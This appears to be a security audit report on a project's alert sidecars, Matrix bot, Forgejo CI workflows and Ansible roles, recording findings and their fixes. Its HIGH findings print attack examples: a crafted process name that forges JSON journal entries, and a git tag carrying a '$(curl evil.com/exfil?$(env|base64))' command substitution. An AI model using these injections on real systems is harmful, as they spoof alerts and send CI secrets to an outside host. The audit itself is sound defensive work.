# SECURITY AUDIT — Part 121 cp18 deep-deep on cp9-cp17 deltas

**Date:** 2026-05-15
**Scope:** Black-hat review of the matrix-bot operator-alerts ecosystem (cp9–cp17): 12 POSIX-sh sidecars running as root, shared `ops/scripts/lib/emit.sh`, matrix-bot classifier + config + smokes, Forgejo CI + release workflows, Ansible playbook + 19 roles, zod schemas across envelope/api/sse smokes, host-monitor mount sweep, smartctl SCT thermal extension.
**Methodology:** Walk each attack surface assuming an unprivileged local user, a malicious package repo, a compromised third-party action, and a malicious git tag pusher. Categorize CRITICAL / HIGH / MEDIUM / LOW. Fix HIGH+ same turn; file lower-severity in REVISIT-LIST.

## Summary

| ID | Severity | Title | Status |
|---|---|---|---|
| AUDIT-1 | HIGH | JSON-injection via control characters in `json_str()` | **FIXED (cp18)** |
| AUDIT-CI-7 | HIGH | Tag-name command injection in `release.yml` | **FIXED (cp18)** |
| AUDIT-CI-1 | MEDIUM | `pull_request:` trigger has no fork filter; PR code runs on CI runner | NOT ACTIONED — reviewer policy item, not a code fix |
| AUDIT-ANSIBLE-1 | MEDIUM | NodeSource setup script runs as root unverified | **FIXED (cp19)** |
| AUDIT-NUMERIC | MEDIUM | Some sidecar numeric fields embedded unquoted; hostile FUSE could break JSON | **FIXED (cp19)** |
| AUDIT-2 | LOW | ANSI escape sequences in `raw_line` plain-text path | **FIXED (cp19)** |
| AUDIT-3 | LOW | Matrix mention injection via mxid-in-raw_line | **FIXED (cp19)** |
| AUDIT-4 | LOW | matrix-bot doesn't cap payload size; compromised-sidecar DoS path | **FIXED (cp19)** |
| AUDIT-CI-2 | LOW | Third-party actions pinned by major version, not SHA | **FIXED (cp19, partial — checkout + setup-node SHA-pinned; upload-artifact left at @v4 with TODO)** |

---

## HIGH severity — FIXED

### AUDIT-1: JSON-injection via control characters in `json_str()`

**Component:** `ops/scripts/lib/emit.sh`, exploitable via every sidecar that emits `raw_line` (primarily `morphit-dmesg-monitor.sh`).

**Attack path:**

1. Unprivileged user spawns a process with `comm` name containing literal newline + crafted JSON:
   ```sh
   exec -a $'evil-proc\n{"ts":"...","level":"error","module":"host-resource","event":"disk_critical","context":{"forged":true}}' /bin/sleep 1
   ```
   Linux permits this via `prctl(PR_SET_NAME)` or `exec -a` for the duration of one process. `comm` names propagate to dmesg.

2. User triggers OOM-kill (e.g. malloc-bomb).

3. Kernel OOM-killer writes to dmesg:
   ```
   Out of memory: Killed process 1234 (evil-proc
   {"ts":"...","level":"error","module":"host-resource","event":"disk_critical","context":{"forged":true}}) total-vm:...
   ```

4. `morphit-dmesg-monitor.sh` reads the line, passes `comm` and `raw_line` through `json_str()`. The pre-fix `json_str()` escaped only `\` and `"` — newline passed through unchanged.

5. The sidecar builds its payload string with the embedded newline still present, pipes it to `systemd-cat`.

6. `systemd-cat` creates one journal entry **per stdin line** — so an embedded `\n` splits one logical emit into TWO journal entries. The second is attacker-controlled JSON.

7. matrix-bot tails journald, parses each line as JSON, finds the forged record, classifies it as a legitimate `host-resource:disk_critical`, DMs the operator.

**Impact:**
- Alert spoofing — DOS the operator's pager with fake CRITICALs; over time, habituation degrades response to real alerts.
- Audit-log poisoning — journald entries contain attacker-controlled JSON; complicates forensics.
- Potential alert suppression if the classifier ever tracks `*_recovered` events to clear stuck state.

**Affected vectors:** dmesg-monitor (unprivileged user via `comm` name) is the primary path. Same vector applies to: compose service names, apt package names from third-party repos, mount paths from hostile FUSE filesystems, certbot cert names — anywhere attacker-influenced strings flow through `json_str()`.

**Fix applied:**

`json_str()` rewritten to encode every C0 control character (0x00–0x1F) per RFC 8259 §7:
- `\b` `\t` `\n` `\f` `\r` get the short-form JSON escapes
- All other 0x00–0x1F get `\uXXXX` form
- Backslash escape FIRST (otherwise the other escapes' backslashes get doubled)
- `sed -z` so that newlines stay in the pattern space (default `sed` reads line-by-line; newlines are line separators, not in the pattern space — the root cause of the initial fix not working)
- `LC_ALL=C` so sed operates byte-wise on invalid-UTF-8 sequences

Documented limitation: NUL bytes are stripped by bash's variable assignment before `json_str()` sees them. Not a real exposure because every untrusted-input path in the sidecars (dmesg, compose, apt, systemd, mount paths, /proc/mdstat, smartctl device paths, cert names) is a domain where NUL is forbidden by the source tool's grammar.

**Regression test:** `apps/matrix-bot/scripts/json-str-injection-smoke.ts` — 11 scenarios feeding known-malicious inputs (newlines, NULs, tabs, ESC chars, all 31 C0 chars, the actual attack payload from this report, UTF-8 edge cases) through `json_str()` and validating round-trip via `JSON.parse`. The smoke caught two bugs in the initial fix attempt before final form.

---

### AUDIT-CI-7: Tag-name command injection in `release.yml`

**Component:** `.forgejo/workflows/release.yml`

**Attack path:**

1. Attacker with push access (or who tricks a maintainer into accepting a PR that pushes a tag) pushes:
   ```
   git tag 'v1.0.0-$(curl evil.com/exfil?$(env|base64))'
   git push origin --tags
   ```
   `git-check-ref-format(1)` does NOT forbid `$`, `(`, `)`, spaces — only `?`, `*`, `[`, `:`, `/`, `\`, `..`, `.lock`-suffix, and ASCII control chars.

2. Workflow fires on `tags: 'v*'`.

3. Pre-fix `release.yml` line 79 wrote `tarball=morphit-${TAG}.tar.gz` to `GITHUB_OUTPUT`, then line 97 used `${{ steps.ver.outputs.tarball }}` inside a `run:` block.

4. Forgejo Actions expands `${{ }}` BEFORE bash parses. So bash sees:
   ```sh
   tar ... -czf "morphit-v1.0.0-$(curl evil.com/exfil?$(env|base64)).tar.gz" .
   ```
   And executes the `$(curl ...)` command substitution.

5. The CI runner has internet access. The attacker exfiltrates env vars / secrets / source / can attack other systems from the CI IP.

**Impact:**
- Arbitrary code execution on the release-builder CI runner
- Potential credential exfiltration if release.yml is ever extended to access secrets (currently not; risk is forward-looking)
- Use of CI compute for crypto-mining / botnet command-and-control

**Fix applied:**

1. **Strict tag-format validation step.** Before any other use of `$TAG`, validate it matches `v[0-9]+.[0-9]+.[0-9]+[-<pre>]` AND contains only `[A-Za-z0-9.-]`. Fails fast with a clear error if the tag doesn't match. Belt-and-braces — both a case-glob shape check AND a forbidden-char rejection.

2. **Pass tag via env var, not `${{ }}` interpolation.** Build + checksum steps now receive `TARBALL` via `env:` rather than substituting directly into the `run:` script. Bash sees a normal variable; no command substitution on its contents.

---

## MEDIUM severity — REVISIT

### AUDIT-CI-1: `pull_request:` trigger runs PR code on CI runner

**Component:** `.forgejo/workflows/ci.yml`

PRs from forked repos run the full smoke suite on the CI runner. A malicious PR could include a smoke script that exfiltrates environment data, attacks other systems from the CI IP, or uses compute for mining. Standard open-source CI threat model.

**Mitigation options:**
- Restrict to `pull_request_target` (uses base-branch workflow); requires careful handling because secrets become accessible — and Morphit doesn't currently expose secrets in ci.yml so the upside is small.
- Manual `workflow_run` gating where a maintainer triggers CI explicitly on PRs.
- Continue current behavior + require maintainer approval before merge (existing practice).

**Recommendation:** keep current behavior pre-launch; revisit when Morphit adds CI secrets.

### AUDIT-ANSIBLE-1: NodeSource setup script runs as root unverified

**Component:** `ops/ansible/roles/morphit/tasks/nodejs.yml`

Downloads `https://deb.nodesource.com/setup_X.x`, executes as root. No checksum, no signature. A NodeSource compromise or MITM (despite HTTPS) would install attacker-controlled software on every Morphit node.

**Mitigation:** refactor to match the docker/trivy pattern — explicitly fetch the GPG key, add the apt repo with `signed-by=`, then `apt install nodejs`. Drops shell-script-as-root from the install path entirely.

**Recommendation:** apply pre-launch. ~30 minutes of work. The risk increment from "trust NodeSource" to "trust NodeSource AND trust the setup script doesn't change" is real but small.

### AUDIT-NUMERIC: Unguarded numeric-field embedding in some sidecars

**Component:** `ops/scripts/morphit-host-monitor.sh` (DISK_PATHS branch), `ops/scripts/morphit-fail2ban-monitor.sh`, `ops/scripts/morphit-smartctl-monitor.sh`, others.

Many payload constructions embed raw variables in numeric positions:
```sh
payload='{"percent":'$pct',"threshold":'$DISK_CRITICAL'}'
```

If `$pct` is somehow non-numeric (hostile FUSE filesystem reporting `"95; junk"` in df output), the resulting JSON is malformed. matrix-bot's parseJournalLine catches malformed JSON and drops it — so the worst case is **alert suppression** (operator never sees a real disk-full event), not RCE.

The mount-sweep branch (cp15) already bounds-checks via `case "$mount_pct_num" in *[!0-9]*) continue;;`. Apply the same pattern to the other numeric paths.

**Mitigation:** add a `json_num()` helper to `emit.sh` that validates a value is numeric (`*[!0-9.-]*` rejection); replace 30+ raw-embedding sites.

**Recommendation:** ship pre-launch. Small change, defensive, matches existing hygiene in cp15 mount-sweep.

---

## LOW severity — REVISIT

### AUDIT-2: ANSI escape sequences in `raw_line` plain-text path

Matrix clients don't render ANSI escapes in plain-text bodies, so no immediate display attack. But operators running `journalctl -u morphit-dmesg-monitor` directly see literal terminal escapes that could clear the terminal or set window titles.

**Mitigation:** strip `0x1B` (ESC) from `raw_line` before embedding. The cp17 json_str fix already encodes it as `\u001b` in the JSON — but matrix-bot decodes back to literal ESC when rendering plain text.

### AUDIT-3: Matrix mention injection via mxid-in-raw_line

If `raw_line` contains `@user:server.tld`, Matrix clients render it as a mention pill (no ping in plain-text bodies, but visual confusion). Defensive sanitization: encode mxids when embedding in `raw_line` field.

### AUDIT-4: matrix-bot doesn't cap payload size

`alert.payload` flows into `JSON.stringify(v)` for the Details block. A compromised sidecar could emit a 50MB payload; Matrix message size limit is ~65KB plain-text, so the bot would crash sending. Add a `MAX_PAYLOAD_BYTES` truncation in `renderAlertBody`.

### AUDIT-CI-2: Third-party actions pinned by major version

`actions/checkout@v4`, `actions/setup-node@v4`, `actions/upload-artifact@v4` — these resolve to whatever the latest v4 release is, which can change. SHA-pinning (e.g. `@cd7d8d697e10461458bc61a30d094dc601a8b017`) is tighter. Trade-off: SHA pins don't auto-receive security fixes.

---

## Out-of-scope but noted

- **Indexer + relay HTTP routes** — unchanged in cp9-17, audited in prior rounds.
- **SQL/DB layer** — unchanged in cp9-17.
- **Crypto / signature handling** — unchanged in cp9-17.
- **Frontend** — unchanged in cp9-17.

## Verification

- AUDIT-1 fix: triple-pulse 2,868 × 3, 0 failures. `json-str-injection-smoke.ts` 11/11 attack payloads round-trip correctly.
- AUDIT-CI-7 fix: `release.yml` parses as valid YAML; format-validation step uses POSIX-shell case-glob + char-class rejection.
- envelope-smoke (24 checks) continues to pass — fix is backwards-compatible for valid inputs.

## Pattern lessons

1. **JSON encoding is not just `\` and `"` escaping.** RFC 8259 §7 requires every C0 control char (0x00-0x1F) to be encoded. The original `json_str()` was a 2003-vintage "good enough for ASCII" approach that doesn't survive attacker-influenced inputs.

2. **`sed` is line-oriented by default.** `s/\x0a/.../g` will never match a newline because GNU sed processes input one line at a time — the newline is the record separator, not in the pattern space. Use `sed -z` to slurp NUL-separated records (one record if no NULs in input).

3. **`${{ }}` expansion in workflow `run:` blocks is shell-injection-equivalent.** The expansion happens BEFORE bash parses, so any shell metacharacter in the substituted value executes. Pass via `env:` instead and reference as `$VAR` — bash treats env vars as plain strings.

4. **Git tag names accept more chars than you'd expect.** `$`, `(`, `)`, spaces are all valid. Validate the format STRICTLY before using a tag in any shell-interpolated context.

5. **Defense-in-depth: write the regression smoke for each fix.** The cp17 json-str smoke caught two bugs in the initial fix (newline pattern not matching due to sed line-orientation; NUL handling not matching documented bash behavior). Without the smoke, both would have shipped.

## Files modified this audit

```
EDITED (security fixes):
  ops/scripts/lib/emit.sh                                (AUDIT-1: json_str control-char encoding)
  .forgejo/workflows/release.yml                          (AUDIT-CI-7: tag-format validation + env-var injection)

NEW:
  apps/matrix-bot/scripts/json-str-injection-smoke.ts    (AUDIT-1 regression smoke; 11 attack payloads)
  docs/SECURITY-AUDIT-2026-05-CP18.md                    (this document)

EDITED (registration + tracking):
  scripts/run-smokes.sh                                  (registered json-str-injection-smoke)
  docs/REVISIT-LIST.md                                   (cp18 maintained-line + MEDIUM/LOW findings)
  apps/web/scripts/persona-walkthrough-smoke.ts          (cp18 sentinels)
  TARBALL.md                                             (cp18 entry — see tarball)
```

---

## cp19 update (2026-05-15) — MEDIUM/LOW findings cleared

Ken said "if it won't take too long to fix those last little things, i don't see why they can't just be knocked out now."  All MEDIUM and LOW findings except AUDIT-CI-1 (which is a reviewer-policy item, not a code fix) are now closed.

### AUDIT-ANSIBLE-1: NodeSource setup script replaced

`ops/ansible/roles/morphit/tasks/nodejs.yml` refactored from "download setup script + run as root" to the apt-repo + GPG-key pattern used by `roles/bunkerweb` (docker) and `roles/trivy_monitor`.  Same install outcome, no shell-script-as-root in the path.

### AUDIT-NUMERIC: `json_num()` helper + bounds-check sites

Added `json_num()` to `ops/scripts/lib/emit.sh`: validates input is a JSON-safe number (digits, optional minus, optional single decimal point); returns `0` otherwise.  Rejects scientific notation, embedded letters, multi-dot/dash, control chars.

Applied at three unguarded sites:
- `morphit-host-monitor.sh` — legacy `DISK_PATHS` `$pct` value
- `morphit-fail2ban-monitor.sh` — `$currently_banned` + `$total_banned`
- `morphit-compose-monitor.sh` — `$restart_count` from `jq` output

The cp15 mount-sweep was already pattern-equivalent; smartctl-monitor's existing `[ "$value" -gt 0 ] 2>/dev/null` guards are also pattern-equivalent — no change needed at those sites.

### AUDIT-2 + AUDIT-3: `sanitize()` in matrix-bot's `substitute()` + Details block

New `sanitize()` function in `classifier.ts`:
- AUDIT-2: drop ASCII control chars except `\t` and `\n` (operator viewing journalctl directly won't see terminal escapes)
- AUDIT-3: defang `@user:server` and `#room:server` patterns by inserting U+200D (zero-width joiner) after the sigil — Matrix client pill-detection regex doesn't match, so kernel strings containing mxids don't render as pings

### AUDIT-4: size cap on rendered payload

`MAX_FIELD_BYTES = 1024`, `MAX_PAYLOAD_BYTES = 8192` constants in `renderAlertBody`.  Per-field exceeding 1KB gets `…(truncated)` suffix; total payload-lines exceeding 8KB get `…(payload truncated)` suffix.  Well under Matrix message limits with headroom for title/advice/metadata.

Regression smoke `apps/matrix-bot/scripts/render-alert-hardening-smoke.ts` — 8 scenarios covering all three defenses + combined-attack scenarios.

### AUDIT-CI-2: third-party actions SHA-pinned

`actions/checkout` → `11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2` (confirmed from multiple sources).
`actions/setup-node` → `1e60f620b9541d16bece96c5465dc8ee9832be0b # v4.0.3` (confirmed from StepSecurity reference).
`actions/upload-artifact` → left at `@v4` with explicit TODO comment — current upstream SHA wasn't confirmable from search results at audit time; bumping requires direct upstream verification.

The `# vX.Y.Z` version comment after each SHA enables Renovate/Dependabot to auto-suggest bumps.

### AUDIT-CI-1: NOT actioned (by design)

`pull_request:` trigger running PR code on CI is the standard open-source threat model.  Mitigations are reviewer-policy items (require maintainer approval before merge; treat PRs as untrusted; don't expose secrets to PR runs).  No code change.

### Files modified this cleanup

```
EDITED:
  ops/ansible/roles/morphit/tasks/nodejs.yml          (AUDIT-ANSIBLE-1)
  ops/scripts/lib/emit.sh                              (AUDIT-NUMERIC: json_num())
  ops/scripts/morphit-host-monitor.sh                 (json_num site)
  ops/scripts/morphit-fail2ban-monitor.sh             (json_num sites)
  ops/scripts/morphit-compose-monitor.sh              (json_num site)
  apps/matrix-bot/src/classifier.ts                    (AUDIT-2/3/4)
  .forgejo/workflows/ci.yml                            (AUDIT-CI-2 SHA pin)
  .forgejo/workflows/release.yml                       (AUDIT-CI-2 SHA pin)

NEW:
  apps/matrix-bot/scripts/render-alert-hardening-smoke.ts   (AUDIT-2/3/4 regression)
```

### Verification

- Triple-pulse: 2,884 × 3, 0 failures.  cp18 baseline 2,871 → cp19 baseline 2,884 (+13 net: 8 render-alert-hardening + 5 persona).
- Typecheck 0 errors, ansible-lint passes production-profile.
- All 8 render-alert-hardening attack scenarios pass on first try.
